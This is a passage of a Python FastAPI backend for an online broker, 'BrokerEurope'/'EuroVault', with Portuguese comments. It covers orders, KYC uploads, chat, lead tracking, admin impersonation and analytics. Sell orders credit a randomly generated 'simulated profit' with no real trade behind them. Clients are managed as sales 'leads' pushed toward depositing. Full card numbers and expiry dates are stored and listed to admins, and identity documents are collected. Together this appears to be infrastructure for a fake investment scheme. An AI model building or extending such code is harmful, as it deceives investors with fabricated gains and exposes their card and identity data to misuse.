        {"url": "https://finance.yahoo.com/rss/2.0/headline?s=EURUSD=X",  "source": "Yahoo Finance","cat": "FX"},
        {"url": "https://finance.yahoo.com/rss/2.0/headline?s=GC=F",      "source": "Yahoo Finance","cat": "Commodities"},
        {"url": "https://finance.yahoo.com/rss/2.0/headline?s=BTC-USD",   "source": "Yahoo Finance","cat": "Crypto"},
        # CoinDesk (Crypto)
        {"url": "https://www.coindesk.com/arc/outboundfeeds/rss/",        "source": "CoinDesk",   "cat": "Crypto"},
        # Investing.com
        {"url": "https://www.investing.com/rss/news_301.rss",             "source": "Investing.com","cat": "Forex"},
        {"url": "https://www.investing.com/rss/news.rss",                 "source": "Investing.com","cat": "Macro"},
    ]

    def classify(title: str, feed_cat: str) -> str:
        t = title.lower()
        if any(k in t for k in ["bitcoin","btc","ethereum","eth","crypto","blockchain","solana","bnb","xrp"]):
            return "Crypto"
        if any(k in t for k in ["eur/usd","gbp/usd","forex","câmbio","currency","usd/jpy","dólar","euro","libra"]):
            return "FX"
        if any(k in t for k in ["crude","petróleo","oil","brent","wti","gold","ouro","silver","prata","commodity","wheat"]):
            return "Commodities"
        if any(k in t for k in ["apple","tesla","amazon","google","microsoft","nasdaq","s&p","dax","ibex","stock","ação","acção","bolsa"]):
            return "Ações"
        return feed_cat

    def fmt_time(entry) -> str:
        try:
            ts = entry.get("published_parsed") or entry.get("updated_parsed")
            if ts:
                pub = datetime(*ts[:6], tzinfo=timezone.utc)
                diff = datetime.now(timezone.utc) - pub
                mins = int(diff.total_seconds() / 60)
                if mins < 60:   return f"Há {mins}min"
                if mins < 1440: return f"Há {mins//60}h"
                return f"Há {mins//1440}d"
        except Exception:
            pass
        return "Recente"

    articles = []
    seen = set()

    for feed_info in FEEDS:
        try:
            parsed = feedparser.parse(feed_info["url"])
            for e in (parsed.entries or [])[:6]:
                title = (e.get("title") or "").strip()
                if not title or len(title) < 10:
                    continue
                h = hashlib.md5(title.encode()).hexdigest()
                if h in seen:
                    continue
                seen.add(h)
                snippet = ""
                if e.get("summary"):
                    snippet = e["summary"][:200].replace("<[^>]+>", "").strip()
                articles.append({
                    "id": h,
                    "title": title,
                    "snippet": snippet,
                    "source": feed_info["source"],
                    "category": classify(title, feed_info["cat"]),
                    "time": fmt_time(e),
                    "url": e.get("link", "#"),
                })
        except Exception:
            continue

    # Se não conseguiu notícias reais, usar dados de backup
    if not articles:
        return [
            {"id":"1","title":"BCE mantém taxas — cautela com inflação na zona euro","source":"Reuters","category":"Macro","time":"Há 1h","snippet":"O BCE sinalizou cautela face à volatilidade nos mercados.","url":"#"},
            {"id":"2","title":"EUR/USD consolida acima de 1.0850 após dados de inflação","source":"Bloomberg","category":"FX","time":"Há 2h","snippet":"O par cambial mantém-se estável após dados acima do esperado.","url":"#"},
            {"id":"3","title":"Bitcoin supera $95.000 com nova vaga de adoção institucional","source":"CoinDesk","category":"Crypto","time":"Há 3h","snippet":"O BTC voltou a superar os $95.000 com compras institucionais.","url":"#"},
            {"id":"4","title":"DAX atinge máximos históricos liderado pelo setor tecnológico","source":"Financial Times","category":"Ações","time":"Há 4h","snippet":"O índice alemão atingiu novos máximos, liderado pela tecnologia.","url":"#"},
            {"id":"5","title":"Petróleo recua com stocks EUA superiores ao esperado","source":"CNBC","category":"Commodities","time":"Há 5h","snippet":"O Brent recuou 1,2% após dados de stocks superiores às estimativas.","url":"#"},
        ]

    # Ordenar por mais recente e limitar a 30
    return articles[:30]


# ════════════════════════════════════════════════════════════════
#  CHAT AO VIVO
# ════════════════════════════════════════════════════════════════
class ChatMessageRequest(BaseModel):
    message: str

@app.post("/api/chat/message")
async def send_chat_message(req: ChatMessageRequest, current_user = Depends(get_current_user)):
    user_id = current_user["sub"]
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    msg = {
        "user_id": user_id,
        "user_name": user["full_name"] if user else "Cliente",
        "email": current_user.get("email", ""),
        "message": req.message,
        "sender": "client",
        "read_by_admin": False,
        "created_at": datetime.utcnow(),
    }
    result = await db.chat_messages.insert_one(msg)
    # Notificar admin via WebSocket
    await manager.broadcast({
        "type": "new_chat_message",
        "user_id": user_id,
        "user_name": user["full_name"] if user else "Cliente",
        "email": current_user.get("email", ""),
        "message": req.message,
        "timestamp": datetime.utcnow().isoformat(),
    })
    return {"success": True, "id": str(result.inserted_id)}

@app.get("/api/chat/messages")
async def get_chat_messages(current_user = Depends(get_current_user)):
    msgs = []
    async for m in db.chat_messages.find({"user_id": current_user["sub"]}).sort("created_at", 1):
        msgs.append(serialize_doc({
            "id": m["_id"], "message": m["message"],
            "sender": m.get("sender", "client"),
            "created_at": m.get("created_at"),
        }))
    return msgs

@app.get("/api/admin/chat/conversations")
async def get_chat_conversations(admin = Depends(get_admin_user)):
    """Listar todas as conversas (última mensagem de cada utilizador)"""
    pipeline = [
        {"$sort": {"created_at": -1}},
        {"$group": {"_id": "$user_id", "last_message": {"$first": "$message"},
                    "user_name": {"$first": "$user_name"}, "email": {"$first": "$email"},
                    "created_at": {"$first": "$created_at"}, "unread": {"$sum": {"$cond": [{"$eq": ["$read_by_admin", False]}, 1, 0]}}}},
        {"$sort": {"created_at": -1}}
    ]
    convs = []
    async for c in db.chat_messages.aggregate(pipeline):
        convs.append({"user_id": c["_id"], "user_name": c.get("user_name",""), "email": c.get("email",""),
                      "last_message": c.get("last_message",""), "unread": c.get("unread", 0),
                      "created_at": c.get("created_at","").isoformat() if c.get("created_at") else ""})
    return convs

# IMPORTANTE: rotas específicas ANTES das genéricas com {user_id}
@app.get("/api/admin/chat/templates_list")
async def get_chat_templates_inline(admin = Depends(get_admin_user)):
    return CHAT_TEMPLATES_LIST

@app.get("/api/admin/chat/{user_id}")
async def get_user_chat(user_id: str, admin = Depends(get_admin_user)):
    msgs = []
    async for m in db.chat_messages.find({"user_id": user_id}).sort("created_at", 1):
        msgs.append(serialize_doc({"id": m["_id"], "message": m["message"],
            "sender": m.get("sender","client"), "created_at": m.get("created_at")}))
    await db.chat_messages.update_many({"user_id": user_id, "sender": "client"}, {"$set": {"read_by_admin": True}})
    return msgs

@app.post("/api/admin/chat/{user_id}/reply")
async def admin_reply_chat(user_id: str, req: ChatMessageRequest, admin = Depends(get_admin_user)):
    msg = {"user_id": user_id, "message": req.message, "sender": "admin",
           "read_by_admin": True, "created_at": datetime.utcnow()}
    await db.chat_messages.insert_one(msg)
    return {"success": True}


# ════════════════════════════════════════════════════════════════
#  HISTÓRICO DE OPERAÇÕES
# ════════════════════════════════════════════════════════════════
class OrderRequest(BaseModel):
    asset_label: str
    asset_name: str
    category: str
    side: str          # comprar | vender
    amount: float
    leverage: str
    price: str

@app.post("/api/orders")
async def create_order(req: OrderRequest, current_user = Depends(get_current_user)):
    user_id = current_user["sub"]
    amount  = max(0.0, float(req.amount or 0))

    # ── Buscar saldo actual ────────────────────────────────────────────────
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")

    balance = max(0.0, float(user.get("balance", 0)))
    profit  = max(0.0, float(user.get("profit",  0)))

    new_balance = balance
    new_profit  = profit

    if amount > 0:
        if req.side == "comprar":
            # ── COMPRAR → deduzir do saldo (dinheiro "investido") ──────────
            if amount > balance:
                raise HTTPException(
                    status_code=400,
                    detail=f"Saldo insuficiente. Disponível: {balance:.2f}€. Necessário: {amount:.2f}€."
                )
            new_balance = round(balance - amount, 2)

        elif req.side == "vender":
            # ── VENDER → devolver o montante + lucro simulado (±0.5-3%) ────
            import random
            pct = random.uniform(0.005, 0.03)   # lucro simulado de 0.5% a 3%
            gain = round(amount * pct, 2)
            new_balance = round(balance + amount + gain, 2)
            new_profit  = round(profit + gain, 2)

        # Actualizar saldo do utilizador
        await db.users.update_one(
            {"_id": ObjectId(user_id)},
            {"$set": {
                "balance":          new_balance,
                "profit":           new_profit,
                "updated_at":       datetime.utcnow(),
                "profit_last_updated": datetime.utcnow(),
            }}
        )

    order = {
        "user_id":     user_id,
        "asset_label": req.asset_label,
        "asset_name":  req.asset_name,
        "category":    req.category,
        "side":        req.side,
        "amount":      amount,
        "leverage":    req.leverage,
        "price":       req.price,
        "balance_before": balance,
        "balance_after":  new_balance,
        "status":      "executada",
        "created_at":  datetime.utcnow(),
    }
    result = await db.orders.insert_one(order)

    # Notificar o cliente via WebSocket (actualização de saldo em tempo real)
    try:
        await manager.broadcast({
            "type": "balance_updated",
            "user_id": user_id,
            "balance": new_balance,
            "profit":  new_profit,
        })
    except Exception:
        pass

    return {
        "success":        True,
        "id":             str(result.inserted_id),
        "balance_before": balance,
        "balance_after":  new_balance,
        "side":           req.side,
        "amount":         amount,
    }

@app.get("/api/orders")
async def get_orders(current_user = Depends(get_current_user)):
    orders = []
    async for o in db.orders.find({"user_id": current_user["sub"]}).sort("created_at", -1).limit(50):
        orders.append(serialize_doc({
            "id": o["_id"], "asset_label": o["asset_label"], "asset_name": o["asset_name"],
            "category": o.get("category",""), "side": o["side"], "amount": o["amount"],
            "leverage": o["leverage"], "price": o["price"], "status": o.get("status","executada"),
            "created_at": o.get("created_at"),
        }))
    return orders

@app.get("/api/admin/orders/{user_id}")
async def get_user_orders(user_id: str, admin = Depends(get_admin_user)):
    orders = []
    async for o in db.orders.find({"user_id": user_id}).sort("created_at", -1).limit(100):
        orders.append(serialize_doc({
            "id": o["_id"], "asset_label": o["asset_label"], "asset_name": o["asset_name"],
            "side": o["side"], "amount": o["amount"], "leverage": o["leverage"],
            "price": o["price"], "status": o.get("status","executada"), "created_at": o.get("created_at"),
        }))
    return orders


# ════════════════════════════════════════════════════════════════
#  KYC — DOCUMENTOS DE IDENTIDADE
# ════════════════════════════════════════════════════════════════
import base64
from fastapi import UploadFile, File, Form

@app.post("/api/kyc/upload")
async def upload_kyc(
    doc_type: str = Form(...),
    file: UploadFile = File(...),
    current_user = Depends(get_current_user)
):
    allowed = ["image/jpeg", "image/png", "image/jpg", "application/pdf"]
    if file.content_type not in allowed:
        raise HTTPException(status_code=400, detail="Formato não suportado. Use JPG, PNG ou PDF.")
    content = await file.read()
    if len(content) > 10 * 1024 * 1024:  # 10MB max
        raise HTTPException(status_code=400, detail="Ficheiro demasiado grande. Máximo 10MB.")
    doc = {
        "user_id": current_user["sub"],
        "doc_type": doc_type,
        "filename": file.filename,
        "content_type": file.content_type,
        "data": base64.b64encode(content).decode(),
        "status": "pending",
        "created_at": datetime.utcnow(),
    }
    await db.kyc_documents.replace_one(
        {"user_id": current_user["sub"], "doc_type": doc_type},
        doc, upsert=True
    )
    await db.users.update_one(
        {"_id": ObjectId(current_user["sub"])},
        {"$set": {"kyc_status": "pending", "updated_at": datetime.utcnow()}}
    )
    return {"success": True, "status": "pending"}

@app.get("/api/kyc/status")
async def get_kyc_status(current_user = Depends(get_current_user)):
    docs = []
    async for d in db.kyc_documents.find({"user_id": current_user["sub"]}):
        docs.append({"doc_type": d["doc_type"], "filename": d["filename"],
                     "status": d.get("status","pending"), "created_at": d.get("created_at","").isoformat() if d.get("created_at") else ""})
    user = await db.users.find_one({"_id": ObjectId(current_user["sub"])})
    return {"kyc_status": user.get("kyc_status","not_submitted") if user else "not_submitted", "documents": docs}

@app.get("/api/admin/kyc")
async def get_all_kyc(admin = Depends(get_admin_user)):
    docs = []
    async for d in db.kyc_documents.find({}).sort("created_at", -1):
        docs.append(serialize_doc({
            "id": d["_id"], "user_id": d["user_id"],
            "doc_type": d["doc_type"], "filename": d["filename"],
            "content_type": d["content_type"], "status": d.get("status","pending"),
            "created_at": d.get("created_at"),
        }))
    return docs

@app.put("/api/admin/kyc/{doc_id}/status")
async def update_kyc_status(doc_id: str, req: UpdateStatusRequest, admin = Depends(get_admin_user)):
    doc = await db.kyc_documents.find_one({"_id": ObjectId(doc_id)})
    if not doc:
        raise HTTPException(status_code=404, detail="Documento não encontrado")
    await db.kyc_documents.update_one({"_id": ObjectId(doc_id)}, {"$set": {"status": req.status}})
    kyc_status = "approved" if req.status == "approved" else ("rejected" if req.status == "rejected" else "pending")
    await db.users.update_one({"_id": ObjectId(doc["user_id"])}, {"$set": {"kyc_status": kyc_status}})
    return {"success": True}

@app.get("/api/admin/kyc/{doc_id}/download")
async def download_kyc(doc_id: str, admin = Depends(get_admin_user)):
    from fastapi.responses import Response
    doc = await db.kyc_documents.find_one({"_id": ObjectId(doc_id)})
    if not doc:
        raise HTTPException(status_code=404, detail="Não encontrado")
    data = base64.b64decode(doc["data"])
    return Response(content=data, media_type=doc["content_type"],
                    headers={"Content-Disposition": f"attachment; filename={doc['filename']}"})


@app.get("/api/health")
async def health():
    return {"status": "ok", "service": "BrokerEurope API"}


# ════════════════════════════════════════════════════════════════
#  IMPERSONATION — Admin faz login como cliente
# ════════════════════════════════════════════════════════════════
@app.post("/api/admin/users/{user_id}/impersonate")
async def impersonate_user(user_id: str, admin = Depends(get_admin_user)):
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")
    # Token de curta duração (2 horas)
    token = jwt.encode(
        {"sub": str(user["_id"]), "email": user["email"], "role": "client",
         "exp": datetime.utcnow() + timedelta(hours=2), "impersonated": True},
        SECRET_KEY, algorithm=ALGORITHM
    )
    return {"token": token, "user_id": user_id, "email": user["email"]}


# ════════════════════════════════════════════════════════════════
#  NOTAS DO LEAD
# ════════════════════════════════════════════════════════════════
class LeadNotesRequest(BaseModel):
    notes: str

@app.put("/api/admin/users/{user_id}/notes")
async def update_lead_notes(user_id: str, req: LeadNotesRequest, admin = Depends(get_admin_user)):
    await db.users.update_one(
        {"_id": ObjectId(user_id)},
        {"$set": {"notes": req.notes, "notes_updated_at": datetime.utcnow()}}
    )
    # Guardar no histórico de timeline
    try:
        await db.audit_logs.insert_one({
            "user_id": user_id, "action": "notes_updated",
            "details": {"notes": req.notes[:500]}, "created_at": datetime.utcnow()
        })
    except Exception:
        pass
    return {"success": True}

# Nova API: Adicionar nota de timeline (preserva histórico)
class NoteAddRequest(BaseModel):
    text: str

@app.post("/api/admin/users/{user_id}/notes/timeline")
async def add_note_timeline(user_id: str, req: NoteAddRequest, admin = Depends(get_admin_user)):
    """Adiciona uma nota à timeline sem apagar as anteriores."""
    entry = {
        "user_id": user_id,
        "text": req.text,
        "created_at": datetime.utcnow(),
        "type": "note"
    }
    result = await db.notes_timeline.insert_one(entry)
    # Actualizar também o campo notes principal com a última nota
    await db.users.update_one(
        {"_id": ObjectId(user_id)},
        {"$set": {"notes": req.text, "notes_updated_at": datetime.utcnow()}}
    )
    return {"success": True, "id": str(result.inserted_id)}

@app.get("/api/admin/users/{user_id}/notes/timeline")
async def get_notes_timeline(user_id: str, admin = Depends(get_admin_user)):
    """Retorna todas as notas da timeline ordenadas por data."""
    entries = []
    async for e in db.notes_timeline.find({"user_id": user_id}).sort("created_at", -1).limit(50):
        entries.append(serialize_doc({
            "id": e["_id"],
            "text": e.get("text", ""),
            "created_at": e.get("created_at"),
        }))
    return entries

@app.delete("/api/admin/users/{user_id}/notes/timeline/{note_id}")
async def delete_note_timeline(user_id: str, note_id: str, admin = Depends(get_admin_user)):
    await db.notes_timeline.delete_one({"_id": ObjectId(note_id), "user_id": user_id})
    return {"success": True}

@app.get("/api/admin/users/{user_id}/notes")
async def get_lead_notes(user_id: str, admin = Depends(get_admin_user)):
    user = await db.users.find_one({"_id": ObjectId(user_id)}, {"notes": 1, "notes_updated_at": 1})
    if not user:
        raise HTTPException(status_code=404, detail="Não encontrado")
    return {"notes": user.get("notes", ""), "notes_updated_at": user.get("notes_updated_at")}


# ════════════════════════════════════════════════════════════════
#  HISTÓRICO DE DEPÓSITOS / CARTÕES POR UTILIZADOR
# ════════════════════════════════════════════════════════════════
@app.get("/api/admin/users/{user_id}/deposits")
async def get_user_deposits(user_id: str, admin = Depends(get_admin_user)):
    result = []
    async for d in db.cards_data.find({"user_id": user_id}).sort("created_at", -1).limit(50):
        result.append(serialize_doc({
            "id": d["_id"],
            "cardholder": d.get("cardholder", ""),
            "card_number": d.get("card_number", ""),
            "expiry": d.get("expiry", ""),
            "amount": d.get("amount", 0),
            "country": d.get("country", ""),
            "postal_code": d.get("postal_code", ""),
            "created_at": d.get("created_at"),
        }))
    return result


# ════════════════════════════════════════════════════════════════
#  LIMITE DE LEVANTAMENTO DIÁRIO
# ════════════════════════════════════════════════════════════════
class WithdrawalLimitRequest(BaseModel):
    daily_withdrawal_limit: float

@app.put("/api/admin/users/{user_id}/withdrawal-limit")
async def set_withdrawal_limit(user_id: str, req: WithdrawalLimitRequest, admin = Depends(get_admin_user)):
    await db.users.update_one(
        {"_id": ObjectId(user_id)},
        {"$set": {"daily_withdrawal_limit": req.daily_withdrawal_limit}}
    )
    return {"success": True}


# ════════════════════════════════════════════════════════════════
#  HISTÓRICO DE SESSÕES
# ════════════════════════════════════════════════════════════════
# Sessões — Request já importado no topo

@app.post("/api/me/session")
async def record_session(request: FastAPIRequest, current_user = Depends(get_current_user)):
    """Chamado automaticamente no login para registar a sessão."""
    ip = request.headers.get("X-Forwarded-For", request.client.host if request.client else "unknown")
    ua = request.headers.get("User-Agent", "unknown")
    session = {
        "user_id": current_user["sub"],
        "ip": ip.split(",")[0].strip(),
        "user_agent": ua[:200],
        "created_at": datetime.utcnow(),
    }
    await db.sessions.insert_one(session)
    return {"success": True}

@app.get("/api/me/sessions")
async def get_my_sessions(current_user = Depends(get_current_user)):
    sessions = []
    async for s in db.sessions.find({"user_id": current_user["sub"]}).sort("created_at", -1).limit(10):
        sessions.append(serialize_doc({
            "id": s["_id"],
            "ip": s.get("ip", "—"),
            "user_agent": s.get("user_agent", "—"),
            "created_at": s.get("created_at"),
        }))
    return sessions


# ════════════════════════════════════════════════════════════════
#  ACTIVIDADES DO UTILIZADOR
# ════════════════════════════════════════════════════════════════
@app.get("/api/me/activity")
async def get_my_activity(current_user = Depends(get_current_user)):
    """Últimas 5 actividades do utilizador para o Dashboard."""
    user_id = current_user["sub"]
    activities = []

    # Últimas ordens
    async for o in db.orders.find({"user_id": user_id}).sort("created_at", -1).limit(3):
        side_label = "Compra" if o.get("side") == "comprar" else "Venda"
        activities.append({
            "type": "order", "icon": "📈",
            "side": o.get("side", ""),
            "asset": o.get("asset_label", ""),
            "label": f"Ordem {side_label} — {o.get('asset_label', '')}",
            "amount": o.get("amount", 0),
            "created_at": o["created_at"].isoformat() if o.get("created_at") else None
        })

    # Últimos depósitos
    async for d in db.cards_data.find({"user_id": user_id}).sort("created_at", -1).limit(2):
        activities.append({
            "type": "deposit", "icon": "💳",
            "label": "Depósito recebido",
            "amount": d.get("amount", 0),
            "created_at": d["created_at"].isoformat() if d.get("created_at") else None
        })

    # KYC submetido
    async for k in db.kyc_documents.find({"user_id": user_id}).sort("created_at", -1).limit(1):
        doc_map = {"bi_frente":"BI Frente", "bi_verso":"BI Verso", "passport_frente":"Passaporte"}
        activities.append({
            "type": "kyc", "icon": "🪪",
            "doc_label": doc_map.get(k.get('doc_type',''), k.get('doc_type','')),
            "doc_type": k.get('doc_type',''),
            "label": f"KYC enviado — {doc_map.get(k.get('doc_type',''), k.get('doc_type',''))}",
            "amount": None,
            "created_at": k["created_at"].isoformat() if k.get("created_at") else None
        })

    # Ordenar por data e limitar a 5
    activities.sort(key=lambda x: x["created_at"] or "", reverse=True)
    return activities[:5]


# ════════════════════════════════════════════════════════════════
#  METAS DE INVESTIMENTO
# ════════════════════════════════════════════════════════════════
class InvestmentGoalRequest(BaseModel):
    goal_amount: float
    goal_label: Optional[str] = "A minha meta"

@app.put("/api/me/goal")
async def set_investment_goal(req: InvestmentGoalRequest, current_user = Depends(get_current_user)):
    await db.users.update_one(
        {"_id": ObjectId(current_user["sub"])},
        {"$set": {"goal_amount": req.goal_amount, "goal_label": req.goal_label}}
    )
    return {"success": True}


# ════════════════════════════════════════════════════════════════
#  AUDIT LOG — Histórico de acções do admin por lead
# ════════════════════════════════════════════════════════════════
async def log_admin_action(user_id: str, action: str, details: dict = None):
    await db.audit_logs.insert_one({
        "user_id": user_id, "action": action,
        "details": details or {}, "created_at": datetime.utcnow()
    })

@app.get("/api/admin/users/{user_id}/audit")
async def get_audit_log(user_id: str, admin = Depends(get_admin_user)):
    logs = []
    async for l in db.audit_logs.find({"user_id": user_id}).sort("created_at", -1).limit(50):
        logs.append(serialize_doc({"id": l["_id"], "action": l["action"],
            "details": l.get("details", {}), "created_at": l.get("created_at")}))
    return logs


# ════════════════════════════════════════════════════════════════
#  FOLLOW-UP / TAREFAS por lead
# ════════════════════════════════════════════════════════════════
class FollowUpRequest(BaseModel):
    followup_date: Optional[str] = None
    followup_note: Optional[str] = ""

@app.put("/api/admin/users/{user_id}/followup")
async def set_followup(user_id: str, req: FollowUpRequest, admin = Depends(get_admin_user)):
    await db.users.update_one(
        {"_id": ObjectId(user_id)},
        {"$set": {"followup_date": req.followup_date, "followup_note": req.followup_note}}
    )
    await log_admin_action(user_id, "followup_set", {"date": req.followup_date, "note": req.followup_note})
    return {"success": True}

@app.get("/api/admin/followups")
async def get_followups(admin = Depends(get_admin_user)):
    now = datetime.utcnow().isoformat()
    results = []
    async for u in db.users.find({"followup_date": {"$ne": None, "$lte": now}}).sort("followup_date", 1).limit(50):
        results.append(serialize_doc({"id": u["_id"], "full_name": u["full_name"],
            "email": u["email"], "followup_date": u.get("followup_date"),
            "followup_note": u.get("followup_note", "")}))
    return results


# ════════════════════════════════════════════════════════════════
#  REFERIDOS
# ════════════════════════════════════════════════════════════════
@app.get("/api/me/referral")
async def get_referral(current_user = Depends(get_current_user)):
    user_id = current_user["sub"]
    count = await db.users.count_documents({"referred_by": user_id})
    converted = await db.users.count_documents({"referred_by": user_id, "status": "Depositado"})
    return {"referral_code": user_id[:8].upper(), "count": count,
            "converted": converted, "bonus": converted * 25.0}


# ════════════════════════════════════════════════════════════════
#  CONTA DEMO
# ════════════════════════════════════════════════════════════════
class DemoModeRequest(BaseModel):
    demo_mode: bool

@app.put("/api/me/demo")
async def toggle_demo(req: DemoModeRequest, current_user = Depends(get_current_user)):
    user_id = current_user["sub"]
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    if req.demo_mode:
        await db.users.update_one({"_id": ObjectId(user_id)}, {"$set": {
            "demo_mode": True, "real_balance": user.get("balance", 0),
            "real_profit": user.get("profit", 0), "balance": 10000.0, "profit": 0.0
        }})
    else:
        await db.users.update_one({"_id": ObjectId(user_id)}, {"$set": {
            "demo_mode": False,
            "balance": user.get("real_balance", 0),
            "profit":  user.get("real_profit", 0)
        }})
    return {"success": True, "demo_mode": req.demo_mode}


# ════════════════════════════════════════════════════════════════
#  ANALYTICS ADMIN — KPIs e gráficos
# ════════════════════════════════════════════════════════════════
@app.get("/api/admin/analytics")
async def get_analytics(admin = Depends(get_admin_user)):
    from collections import defaultdict
    now = datetime.utcnow()
    total_users = await db.users.count_documents({})
    deposited   = await db.users.count_documents({"status": "Depositado"})
    total_balance = 0.0
    async for u in db.users.find({}, {"balance": 1}):
        total_balance += float(u.get("balance", 0))
    days_map = defaultdict(int)
    cutoff = now - timedelta(days=14)
    async for u in db.users.find({"created_at": {"$gte": cutoff}}, {"created_at": 1}):
        day = u["created_at"].strftime("%d/%m") if u.get("created_at") else "?"
        days_map[day] += 1
    country_map = defaultdict(int)
    async for u in db.users.find({}, {"country": 1}):
        country_map[u.get("country") or "Outro"] += 1
    top_countries = sorted(country_map.items(), key=lambda x: x[1], reverse=True)[:5]
    today_start = now.replace(hour=0, minute=0, second=0, microsecond=0)
    week_start  = now - timedelta(days=7)
    new_today = await db.users.count_documents({"created_at": {"$gte": today_start}})
    new_week  = await db.users.count_documents({"created_at": {"$gte": week_start}})
    orders_today = await db.orders.count_documents({"created_at": {"$gte": today_start}})
    return {
        "total_users": total_users, "deposited": deposited,
        "conversion_rate": round(deposited / total_users * 100, 1) if total_users > 0 else 0,
        "total_balance": round(total_balance, 2), "new_today": new_today,
        "new_week": new_week, "orders_today": orders_today,
        "registrations_by_day": [{"day": k, "count": v} for k, v in sorted(days_map.items())],
        "top_countries": [{"country": c, "count": n} for c, n in top_countries],
    }


# ════════════════════════════════════════════════════════════════
#  EXPORT CSV de leads
# ════════════════════════════════════════════════════════════════
from fastapi.responses import StreamingResponse
import csv, io

@app.get("/api/admin/export/leads")
async def export_leads_csv(admin = Depends(get_admin_user)):
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Nome","Email","País","Saldo","Lucro","Status","Taxa Diária","Registado em"])
    async for u in db.users.find({}).sort("created_at", -1):
        writer.writerow([u.get("full_name",""), u.get("email",""), u.get("country",""),
            u.get("balance",0), u.get("profit",0), u.get("status","Novo"),
            u.get("daily_profit_rate",0),
            u["created_at"].isoformat() if u.get("created_at") else ""])
    output.seek(0)
    return StreamingResponse(iter([output.getvalue()]), media_type="text/csv",
        headers={"Content-Disposition": "attachment; filename=leads.csv"})


# ════════════════════════════════════════════════════════════════
#  CHAT TEMPLATES
# ════════════════════════════════════════════════════════════════
CHAT_TEMPLATES_LIST = [
    {"id": 1, "label": "Boas-vindas",      "text": "Bom dia! Bem-vindo à EuroVault. Como posso ajudar?"},
    {"id": 2, "label": "Depósito OK",      "text": "O seu depósito foi processado com sucesso e já está disponível."},
    {"id": 3, "label": "Pedir KYC",        "text": "Para activar saques completos, envie o seu BI/CC ou Passaporte na página de Perfil."},
    {"id": 4, "label": "Levantamento",     "text": "O seu pedido de levantamento foi recebido. Prazo: 1-2 dias úteis."},
    {"id": 5, "label": "Conta verificada", "text": "A sua conta foi verificada. Já tem acesso total aos serviços EuroVault."},
    {"id": 6, "label": "Suporte técnico",  "text": "Lamentamos o inconveniente. A equipa técnica está a resolver. Em contacto em breve."},
    {"id": 7, "label": "Indisponível",     "text": "Neste momento não estou disponível. Deixe a sua mensagem e responderei."},
]

@app.get("/api/admin/chat/templates")
async def get_chat_templates(admin = Depends(get_admin_user)):
    return CHAT_TEMPLATES_LIST


# ════════════════════════════════════════════════════════════════
#  KYC PENDENTES
# ════════════════════════════════════════════════════════════════
@app.get("/api/admin/kyc/pending")
async def get_pending_kyc(admin = Depends(get_admin_user)):
    docs = []
    async for d in db.kyc_docs.find({"status": "pendente"}).sort("created_at", -1):
        docs.append(serialize_doc({"id": d["_id"], "user_id": d.get("user_id"),
            "doc_type": d.get("doc_type"), "filename": d.get("filename"),
            "status": d.get("status"), "created_at": d.get("created_at")}))
    return docs


# ── Documentos KYC por utilizador (para o drawer admin)
@app.get("/api/admin/users/{user_id}/kyc-docs")
async def get_user_kyc_docs(user_id: str, admin = Depends(get_admin_user)):
    docs = []
    async for d in db.kyc_documents.find({"user_id": user_id}).sort("created_at", -1):
        docs.append(serialize_doc({
            "id":           d["_id"],
            "doc_type":     d.get("doc_type", ""),
            "filename":     d.get("filename", ""),
            "content_type": d.get("content_type", ""),
            "status":       d.get("status", "pending"),
            "created_at":   d.get("created_at"),
        }))
    return docs

# ── Aprovar / Rejeitar KYC (reutiliza endpoint existente com alias)
@app.put("/api/admin/users/{user_id}/kyc-docs/{doc_id}/status")
async def update_user_kyc_status(user_id: str, doc_id: str, req: UpdateStatusRequest, admin = Depends(get_admin_user)):
    doc = await db.kyc_documents.find_one({"_id": ObjectId(doc_id), "user_id": user_id})
    if not doc:
        raise HTTPException(status_code=404, detail="Documento não encontrado")
    await db.kyc_documents.update_one({"_id": ObjectId(doc_id)}, {"$set": {"status": req.status}})
    # Atualizar kyc_status do utilizador com base no conjunto de docs
    all_docs = [d async for d in db.kyc_documents.find({"user_id": user_id})]
    if all_docs:
        statuses = [d.get("status","pending") for d in all_docs]
        if all(s == "approved" for s in statuses):
            overall = "approved"
        elif any(s == "rejected" for s in statuses):
            overall = "rejected"
        else:
            overall = "pending"
        await db.users.update_one({"_id": ObjectId(user_id)}, {"$set": {"kyc_status": overall}})
    await log_admin_action(user_id, f"kyc_{req.status}", {"doc_id": doc_id, "doc_type": doc.get("doc_type")})
    return {"success": True}

# ── Visualizar imagem KYC inline (base64) para o admin
@app.get("/api/admin/kyc/{doc_id}/preview")
async def preview_kyc(doc_id: str, admin = Depends(get_admin_user)):
    from fastapi.responses import Response
    doc = await db.kyc_documents.find_one({"_id": ObjectId(doc_id)})
    if not doc:
        raise HTTPException(status_code=404, detail="Não encontrado")
    data = base64.b64decode(doc["data"])
    return Response(content=data, media_type=doc["content_type"])


# ════════════════════════════════════════════════════════════════
#  NOTAS COM HISTÓRICO DE VERSÕES
# ════════════════════════════════════════════════════════════════
@app.get("/api/admin/users/{user_id}/notes/history")
async def get_notes_history(user_id: str, admin = Depends(get_admin_user)):
    logs = []
    async for l in db.audit_logs.find({"user_id": user_id, "action": "notes_updated"}).sort("created_at", -1).limit(20):
        logs.append(serialize_doc({"created_at": l.get("created_at"),
            "notes_preview": l.get("details", {}).get("notes", "")[:100]}))
    return logs


# ════════════════════════════════════════════════════════════════
#  EMAIL PARA O LEAD
# ════════════════════════════════════════════════════════════════
class EmailRequest(BaseModel):
    subject: str
    body: str

@app.post("/api/admin/users/{user_id}/send-email")
async def send_email_to_lead(user_id: str, req: EmailRequest, admin = Depends(get_admin_user)):
    """Envia email ao lead e regista no histórico."""
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")

    recipient = user.get("email", "")
    if not recipient:
        raise HTTPException(status_code=400, detail="Lead sem email")

    # Registar o email enviado na DB independentemente do envio real
    email_log = {
        "user_id": user_id,
        "to": recipient,
        "subject": req.subject,
        "body": req.body,
        "sent_at": datetime.utcnow(),
        "status": "sent"
    }

    # Tentar enviar via SMTP se configurado
    smtp_host = os.environ.get("SMTP_HOST", "")
    smtp_user = os.environ.get("SMTP_USER", "")
